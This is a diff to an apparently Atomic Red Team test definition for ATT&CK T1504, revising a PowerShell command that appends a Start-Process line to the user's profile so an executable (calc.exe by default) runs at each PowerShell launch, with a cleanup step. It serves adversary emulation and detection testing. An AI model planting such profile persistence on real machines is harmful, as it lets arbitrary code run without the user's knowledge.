@@ -3,12 +3,12 @@ attack_technique: T1504
 display_name: PowerShell Profile
 
 atomic_tests:
-- name: Append malicious start-process cmdlet 
+- name: Append malicious start-process cmdlet
   description: |
-    Appends a start process cmdlet to the current user's powershell profile pofile that points to a malicious executable
+    Appends a start process cmdlet to the current user's powershell profile pofile that points to a malicious executable. Upon execution, calc.exe will be launched.
   supported_platforms:
     - windows
-   
+
   input_arguments:
     exe_path:
       description: Path the malicious executable
@@ -20,18 +20,22 @@ atomic_tests:
       type: String
       default: $profile
 
+  dependency_executor_name: powershell
+  dependencies:
+    - description: |
+        Ensure a powershell profile exists for the current user
+      prereq_command: |
+        if (Test-Path #{ps_profile}) {exit 0} else {exit 1}
+      get_prereq_command: |
+        New-Item -Path #{ps_profile} -Type File -Force
+
   executor:
     name: powershell
     elevation_required: false
-    command: | 
-      if(Test-Path #{ps_profile}){
-      }
-      else{
-        New-Item -Path #{ps_profile} -Type File -Force
-      }
-      $malicious = "Start-Process #{exe_path}"
-      Add-Content #{ps_profile} -Value $malicious
-      powershell -command exit
-    cleanup_command: | 
+    command: |
+      Add-Content #{ps_profile} -Value ""
+      Add-Content #{ps_profile} -Value "Start-Process #{exe_path}"
+      powershell -Command exit
+    cleanup_command: |
       $oldprofile = cat $profile | Select-Object -skiplast 1
       Set-Content $profile -Value $oldprofile
